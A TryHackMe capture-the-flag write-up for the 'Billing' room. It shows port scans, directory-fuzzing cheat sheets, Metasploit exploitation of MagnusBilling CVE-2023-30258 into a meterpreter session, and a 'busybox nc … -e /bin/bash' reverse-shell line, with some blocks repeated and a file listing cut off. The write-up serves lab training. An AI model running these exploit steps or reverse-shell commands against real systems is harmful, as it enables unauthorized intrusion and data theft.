---
title: "TryHackme: Billing"
author: NeoVirex
categories: [TryHackMe]
tags: [thm]
render_with_liquid: false
media_subpath: /images/tryhackme/tryhackme_billing/
image:
  path: room_img.png
description: "The Billing room on TryHackMe teaches you how to exploit a vulnerable billing system using basic web hacking techniques."
---
Created: April 18, 2025 1:07 PM
Finishing Date: April 18, 2025 → April 18, 2025
Status: Done

## Reconnaissance && Service Enumeration

### Rustscan >> open port’s

```jsx
└─$ rustscan -a 10.10.201.100       

[~] The config file is expected to be at "/home/neo/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.201.100:22
Open 10.10.201.100:80
Open 10.10.201.100:3306
Open 10.10.201.100:5038
....
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
3306/tcp open  mysql   syn-ack ttl 63
5038/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
           Raw packets sent: 8 (328B) | Rcvd: 5 (204B)

```

### nmap >> versions , server running

```jsx
└─$ nmap -sC -A -p22,80,3306,5038 10.10.201.100
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-18 13:09 EDT
Nmap scan report for 10.10.201.100
Host is up (0.13s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
|_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
80/tcp   open  http     Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
| http-title:             MagnusBilling        
|_Requested resource was http://10.10.201.100/mbilling/
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   128.18 ms 10.23.0.1
2   126.13 ms 10.10.201.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.89 seconds
                                                            
```

```jsx
nmap -sV -p22,80,3306,5038 10.10.201.100
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-18 13:07 EDT
Nmap scan report for 10.10.201.100
Host is up (0.13s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.56 ((Debian))
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.08 seconds
                                                            
```

## Web Application Analysis

**Burp Suite,  OWASP ZAP,   Nikto,   Wapiti,    Dirbuster**

### FFUF  writeups

```jsx
gobuster dir -u http://10.10.57.123/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200

ffuf -u http://10.10.57.123/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt -t 500 -c -recursion

dirsearch -u http://10.10.57.123/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt -e php,html,js,zip,sql -t 200

# Directory brute-force with FFUF using a common wordlist
$ ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
# Fuzz for common directories like /admin/, /login/, /uploads/

# File extension fuzzing (PHP, TXT) using FFUF
$ ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.bak
# Find hidden files with specific extensions

# Recursive directory fuzzing with FFUF
$ ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -recursion
# Scan deeper into discovered directories

# Subdomain fuzzing (vhost discovery) with FFUF
$ ffuf -u http://target.com -H "Host: FUZZ.target.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
# Discover hidden vhosts served by the same IP

# POST data parameter fuzzing with FFUF
$ ffuf -u http://target.com/login -X POST -d "username=FUZZ&password=pass" -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt
# Test for valid usernames

```

### GOBUSTER writeups

```jsx
# Directory brute-force with Gobuster using a common Kali wordlist
$ gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
# Most common directory enumeration scan

# Gobuster with file extension support
$ gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak
# Try to find /admin.php, /config.bak, etc.

# DNS subdomain brute-forcing with Gobuster
$ gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
# Discover subdomains like api.target.com, dev.target.com

# Vhost (virtual host) fuzzing with Gobuster
$ gobuster vhost -u http://target.com -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
# Check for hidden vhosts served by same IP

# HTTPS fuzzing with Gobuster
$ gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
# Same as HTTP, but over TLS
```

```jsx
└─$ ffuf -u http://10.10.201.100/FUZZ -w /usr/share/wordlists/dirb/common.txt

....
                        [Status: 302, Size: 1, Words: 1, Lines: 2, Duration: 136ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 146ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 146ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 147ms]
akeeba.backend.log      [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 127ms]
development.log         [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 141ms]
index.php               [Status: 302, Size: 1, Words: 1, Lines: 2, Duration: 136ms]
production.log          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 141ms]
robots.txt              [Status: 200, Size: 37, Words: 3, Lines: 5, Duration: 141ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 142ms]
spamlog.log             [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 132ms]
:: Progress: [4614/4614] :: Job [1/1] :: 277 req/sec :: Duration: [0:00:16] :: Errors: 0 ::
               
```

## Vulnerability Scanning

[Exploit-DB,](https://www.exploit-db.com/)        [CVE Details,](https://www.cvedetails.com/)    [ZeroDay Initiative (ZDI),](https://www.zerodayinitiative.com/)           [Exploit Tracker,](https://www.exploittracker.net/)          [Metasploit Exploit Database](https://docs.metasploit.com/docs/using-metasploit/interfacing/metasploit-module-library.html)

[Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/)

## **Shell As asterisk**

This has an unauthenticated remote command execution vulnerability `CVE-2023-30258`, which is available as a manual exploit but is also present in the Metasploit framework.

## Exploit & Initial Access

```jsx
─$ msfconsole 
...
msf6 > **search magnus**

Matching Modules
================
   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258  2023-06-26       excellent  Yes    MagnusBilling application unauthenticated Remote Command Execution.
   1    \_ target: PHP                                            .                .          .      .
   2    \_ target: Unix Command                                   .                .          .      .
   3    \_ target: Linux Dropper                                  .                .          .      .

msf6 > use 0
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > show options

Module options (exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258):
...
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set LHOST 10.14.90.235
LHOST => 10.14.90.235
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set RHOST billing.thm
RHOST => billing.thm
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > run
```

```
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > run
[*] Started reverse TCP handler on 10.23.89.97:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 10.10.201.100:80 can be exploited.
[*] Performing command injection test issuing a sleep command of 8 seconds.
[*] Elapsed time: 8.33 seconds.
[+] The target is vulnerable. Successfully tested command injection.
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (40004 bytes) to 10.10.201.100
[+] Deleted KfUZjSCIiR.php
[*] Meterpreter session 1 opened (10.23.89.97:4444 -> 10.10.201.100:57534) at 2025-04-18 13:27:24 -0400

meterpreter > help
                                                                                                              
Core Commands                                                                                                 
=============                                                                                                 
                                                                                                              
    Command                   Description                                                                     
    -------                   -----------                                                                     
    ?                         Help menu                                                                       
    background                Backgrounds the current session                                                 
...

meterpreter > ls
Listing: /var/www/html/mbilling/lib/icepay
==========================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100700/rwx------  768    fil   2024-02-27 14:44:28 -0500  icepay-cc.php
100700/rwx------  733    fil   2024-02-27 14:44:28 -0500  icepay-ddebit.php
100700/rwx------  736    fil   2024-02-27 14:44:28 -0500  icepay-directebank.php
100700/rwx------  730    fil   2024-02-27 14:44:28 -0500  icepay-giropay.php
100700/rwx------  671    fil   2024-02-27 14:44:28 -0500  icepay-ideal.php
100700/rwx------  720    fil   2024-02-27 14:44:28 -0500  icepay-mistercash.php
100700/rwx------  710    fil   2024-02-27 14:44:28 -0500  icepay-paypal.php
100700/rwx------  699    fil   2024-02-27 14:44:28 -0500  icepay-paysafecard.php
100700/rwx------  727    fil   2024-02-27 14:44:28 -0500  icepay-phone.php
100700/rwx------  723    fil   2024-02-27 14:44:28 -0500  icepay-sms.php
100700/rwx------  699    fil   2024-02-27 14:44:28 -0500  icepay-wire.php
100700/rwx------  25097  fil   2024-03-27 15:55:23 -0400  icepay.php
100644/rw-r--r--  0      fil   2024-09-13 05:17:00 -0400  null

meterpreter > cd
Usage: cd directory
meterpreter > cd ..
meterpreter > ls
Listing: /var/www/html/mbilling/lib
===================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  GoogleAuthenticator
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  PlacetoPay
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  anet
100700/rwx------  64    fil   2024-02-27 14:44:28 -0500  composer.json
100700/rwx------  2459  fil   2024-02-27 14:44:28 -0500  composer.lock
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  gerencianet
040755/rwxr-xr-x  4096  dir   2025-04-18 13:27:23 -0400  icepay
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  mercadopago
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  stripe

meterpreter > cd GoogleAuthenticator
meterpreter > ls
Listing: /var/www/html/mbilling/lib/GoogleAuthenticator
=======================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100700/rwx------  6685  fil   2024-02-27 14:44:28 -0500  GoogleAuthenticator.php

meterpreter > meterpreter > download GoogleAuthenticator.php
[*] Downloading: GoogleAuthenticator.php -> /home/neo/GoogleAuthenticator.php
[*] Downloaded 6.53 KiB of 6.53 KiB (100.0%): GoogleAuthenticator.php -> /home/neo/GoogleAuthenticator.php
[*] Completed  : GoogleAuthenticator.php -> /home/neo/GoogleAuthenticator.php
meterpreter > ls
Listing: /var/www/html/mbilling/lib/GoogleAuthenticator
=======================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100700/rwx------  6685  fil   2024-02-27 14:44:28 -0500  GoogleAuthenticator.php

meterpreter > cd ..
meterpreter > ls
Listing: /var/www/html/mbilling/lib
===================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  GoogleAuthenticator
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  PlacetoPay
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  anet
100700/rwx------  64    fil   2024-02-27 14:44:28 -0500  composer.json
100700/rwx------  2459  fil   2024-02-27 14:44:28 -0500  composer.lock
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  gerencianet
040755/rwxr-xr-x  4096  dir   2025-04-18 13:27:23 -0400  icepay
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  mercadopago
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  stripe

meterpreter > shell
Process 2078 created.
Channel 2 created.
id
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
busybox nc 10.23.89.97 4444 -e /bin/bash
ls

```

## Privilege Escalation

### tools writups

### 🐧 **Linux Privilege Escalation Tools**

1. [**LinPEAS**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) – Bash script for Linux privilege escalation enumeration.
2. [**Linux Exploit Suggester 2**](https://github.com/jondonas/linux-exploit-suggester-2) – Bash script that suggests exploits based on kernel version.
3. [**LES - Linux Exploit Suggester**](https://github.com/mzet-/linux-exploit-suggester) – Older but still useful version written in Perl.
4. [**BeRoot (Linux)**](https://github.com/AlessandroZ/BeRoot) – Linux local privilege escalation checks in Python.
5. [**LinEnum**](https://github.com/rebootuser/LinEnum) – Bash script for enumerating privilege escalation vectors.
6. [**GTFOBins**](https://gtfobins.github.io/) – Not a tool, but a searchable database of Unix binaries that can be exploited for privilege escalation.

---

### 🪟 **Windows Privilege Escalation Tools**

1. [**WinPEAS**](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) – Powerful enumeration tool for Windows (exe and bat versions).
2. [**PowerUp**](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) – PowerShell-based tool for privilege escalation checks.
3. [**Windows Exploit Suggester - NextGen (WES-NG)**](https://github.com/bitsadmin/wesng) – Python-based local exploit suggester.
4. [**BeRoot (Windows)**](https://github.com/AlessandroZ/BeRoot) – Local privilege escalation checker (Python-based, requires pywin32).
5. [**Seatbelt**](https://github.com/GhostPack/Seatbelt) – C# tool that grabs a wide range of security-relevant Windows data.
6. [**Sherlock**](https://github.com/rasta-mouse/Sherlock) – PowerShell script to find missing patches that allow local privilege escalation.

---

### 💡 **Bonus - Cross-Platform / Language-Specific Scripts**

- [**PEASS-ng**](https://github.com/carlospolop/PEASS-ng) – Central repo that includes linPEAS, winPEAS, and other helpers.
- [**PrivescCheck**](https://github.com/itm4n/PrivescCheck) – Windows privilege escalation checker using PowerShell.
- [**Privilege-Escalation-Awesome-Scripts-Suite (P.E.A.S.S)**](https://github.com/carlospolop/PEASS-ng) – Massive collection of PE tools.

[Upgrade Simple Shells to Fully Interactive TTYs](https://0xffsec.com/handbook/shells/full-tty/)

### After getting the shell  run help and ls to see what is there

```jsx
ls

==========================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100700/rwx------  768    fil   2024-02-27 14:44:28 -0500  icepay-cc.php
100700/rwx------  733    fil   2024-02-27 14:44:28 -0500  icepay-ddebit.php
100700/rwx------  736    fil   2024-02-27 14:44:28 -0500  icepay-directebank.php
100700/rwx------  730    fil   2024-02-27 14:44:28 -0500  icepay-giropay.php
100700/rwx------  671    fil   2024-02-27 14:44:28 -0500  icepay-ideal.php
100700/rwx------  720    fil   2024-02-27 14:44:28 -0500  icepay-mistercash.php
100700/rwx------  710    fil   2024-02-27 14:44:28 -0500  icepay-paypal.php
100700/rwx------  699    fil   2024-02-27 14:44:28 -0500  icepay-paysafecard.php
100700/rwx------  727    fil   2024-02-27 14:44:28 -0500  icepay-phone.php
100700/rwx------  723    fil   2024-02-27 14:44:28 -0500  icepay-sms.php
100700/rwx------  699    fil   2024-02-27 14:44:28 -0500  icepay-wire.php
100700/rwx------  25097  fil   2024-03-27 15:55:23 -0400  icepay.php
100644/rw-r--r--  0      fil   2024-09-13 05:17:00 -0400  null

meterpreter > cd
Usage: cd directory
meterpreter > cd ..
meterpreter > ls
Listing: /var/www/html/mbilling/lib
===================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  GoogleAuthenticator
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  PlacetoPay
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  anet
100700/rwx------  64    fil   2024-02-27 14:44:28 -0500  composer.json
100700/rwx------  2459  fil   2024-02-27 14:44:28 -0500  composer.lock
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  gerencianet
040755/rwxr-xr-x  4096  dir   2025-04-18 13:27:23 -0400  icepay
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  mercadopago
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  stripe

meterpreter > cd GoogleAuthenticator
meterpreter > ls
Listing: /var/www/html/mbilling/lib/GoogleAuthenticator
=======================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100700/rwx------  6685  fil   2024-02-27 14:44:28 -0500  GoogleAuthenticator.php

meterpreter > cat GoogleAuthenticator.php
<?php

/**
 * PHP Class for handling Google Authenticator 2-factor authentication
 *
 * @author Michael Kliewe
 * @copyright 2012 Michael Kliewe
 * @license http://www.opensource.org/licenses/bsd-license.php BSD License
 * @link http://www.phpgangsta.de/
 */

class PHPGangsta_GoogleAuthenticator
....

meterpreter > download GoogleAuthenticator.php
[*] Downloading: GoogleAuthenticator.php -> /home/neo/GoogleAuthenticator.php
[*] Downloaded 6.53 KiB of 6.53 KiB (100.0%): GoogleAuthenticator.php -> /home/neo/GoogleAuthenticator.php
[*] Completed  : GoogleAuthenticator.php -> /home/neo/GoogleAuthenticator.php
meterpreter > ls
Listing: /var/www/html/mbilling/lib/GoogleAuthenticator
=======================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100700/rwx------  6685  fil   2024-02-27 14:44:28 -0500  GoogleAuthenticator.php

meterpreter > cd ..
meterpreter > ls
Listing: /var/www/html/mbilling/lib
===================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  GoogleAuthenticator
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  PlacetoPay
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  anet
100700/rwx------  64    fil   2024-02-27 14:44:28 -0500  composer.json
100700/rwx------  2459  fil   2024-02-27 14:44:28 -0500  composer.lock
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  gerencianet
040755/rwxr-xr-x  4096  dir   2025-04-18 13:27:23 -0400  icepay
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  mercadopago
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  stripe
...
```

### getting to shell of target  by shell

```jsx

meterpreter > shell
Process 2078 created.
Channel 2 created.
id
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
busybox nc 10.23.89.97 4444 -e /bin/bash
ls
/bin/bash: line 1: l: command not found
/bin/bash: line 2: sls: command not found
/bin/bash: line 12: user.txt: command not found
/bin/bash: line 18: sl: command not found
/bin/bash: line 21: cd: .ssh: Permission denied
/bin/bash: line 22: sl: command not found
/bin/bash: line 24: cd: .ssh: Permission denied

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
/bin/bash: line 27: cd: HOME not set
/bin/bash: line 32: cd: /usr/bin/fail2ban-client: Not a directory
eo)-[~]
              
```

### nmap scan

```jsx
                                                                                                                                                                      
┌──(neo㉿neo)-[~]                                                                  
└─$ nmap -sC -A -p22,80,3306,5038 10.10.201.100
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-18 13:09 EDT
Nmap scan report for 10.10.201.100
Host is up (0.13s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
|_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
80/tcp   open  http     Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
| http-title:             MagnusBilling        
|_Requested resource was http://10.10.201.100/mbilling/
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   128.18 ms 10.23.0.1
2   126.13 ms 10.10.201.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.89 seconds
                 
```

### FFUF

```jsx
┌──(neo㉿neo)-[~]
└─$ ffuf -u http://10.10.201.100/FUZZ -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.201.100/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 302, Size: 1, Words: 1, Lines: 2, Duration: 136ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 146ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 146ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 147ms]
akeeba.backend.log      [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 127ms]
development.log         [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 141ms]
index.php               [Status: 302, Size: 1, Words: 1, Lines: 2, Duration: 136ms]
production.log          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 141ms]
robots.txt              [Status: 200, Size: 37, Words: 3, Lines: 5, Duration: 141ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 142ms]
spamlog.log             [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 132ms]
:: Progress: [4614/4614] :: Job [1/1] :: 277 req/sec :: Duration: [0:00:16] :: Errors: 0 ::
                                                                                                              
┌──(neo㉿neo)-[~]
└─$ gobuster dir -u http://10.10.201.100 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.201.100
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/akeeba.backend.log   (Status: 403) [Size: 278]
/development.log      (Status: 403) [Size: 278]
/index.php            (Status: 302) [Size: 1] [--> ./mbilling]
/production.log       (Status: 403) [Size: 278]
/robots.txt           (Status: 200) [Size: 37]
/server-status        (Status: 403) [Size: 278]
/spamlog.log          (Status: 403) [Size: 278]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
                
```

### Starting msfconsole

```jsx
                                                                        
┌──(neo㉿neo)-[~]
└─$ msfconsole
Metasploit tip: Save the current environment with the save command, 
future console restarts will use this environment again
...

       =[ metasploit v6.4.50-dev                          ]
+ -- --=[ 2496 exploits - 1283 auxiliary - 431 post       ]
+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search magnus

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258  2023-06-26       excellent  Yes    MagnusBilling application unauthenticated Remote Command Execution.
   1    \_ target: PHP                                            .                .          .      .
   2    \_ target: Unix Command                                   .                .          .      .
   3    \_ target: Linux Dropper                                  .                .          .      .

Interact with a module by name or index. For example info 3, use 3 or use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258                                                                                        
After interacting with a module you can manually set a TARGET with set TARGET 'Linux Dropper'

msf6 > use 0
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > show options

Module options (exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-meta
                                         sploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /mbilling        yes       The MagnusBilling endpoint URL
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host

   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an add
                                       ress on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.

   When TARGET is 0:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   WEBSHELL                   no        The name of the webshell with extension. Webshell name will be rando
                                        mly generated if left unset.

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   PHP

```

### starting attacking

```jsx

View the full module info with the info, or info -d command.

msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > 
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set LHOST 10.23.89.97
LHOST => 10.23.89.97
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set RHOST 10.10.201.100
RHOST => 10.10.201.100
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > run
[*] Started reverse TCP handler on 10.23.89.97:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 10.10.201.100:80 can be exploited.
[*] Performing command injection test issuing a sleep command of 8 seconds.
[*] Elapsed time: 8.33 seconds.
[+] The target is vulnerable. Successfully tested command injection.
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (40004 bytes) to 10.10.201.100
[+] Deleted KfUZjSCIiR.php
[*] Meterpreter session 1 opened (10.23.89.97:4444 -> 10.10.201.100:57534) at 2025-04-18 13:27:24 -0400

meterpreter >
```

### we find the google auth… file and lat as check it out

```jsx

meterpreter > ls
Listing: /var/www/html/mbilling/lib
===================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  GoogleAuthenticator
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  PlacetoPay
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  anet
100700/rwx------  64    fil   2024-02-27 14:44:28 -0500  composer.json
100700/rwx------  2459  fil   2024-02-27 14:44:28 -0500  composer.lock
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  gerencianet
040755/rwxr-xr-x  4096  dir   2025-04-18 13:27:23 -0400  icepay
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  mercadopago
040700/rwx------  4096  dir   2024-02-27 14:44:28 -0500  stripe

meterpreter > cd GoogleAuthenticator
meterpreter > ls
Listing: /var/www/html/mbilling/lib/GoogleAuthenticator
=======================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100700/rwx------  6685  fil   2024-02-27 14:44:28 -0500  GoogleAuthenticator.php

meterpreter > cat GoogleAuthenticator.php
<?php

/**
 * PHP Class for handling Google Authenticator 2-factor authentication
 *
 * @author Michael Kliewe
 * @copyright 2012 Michael Kliewe
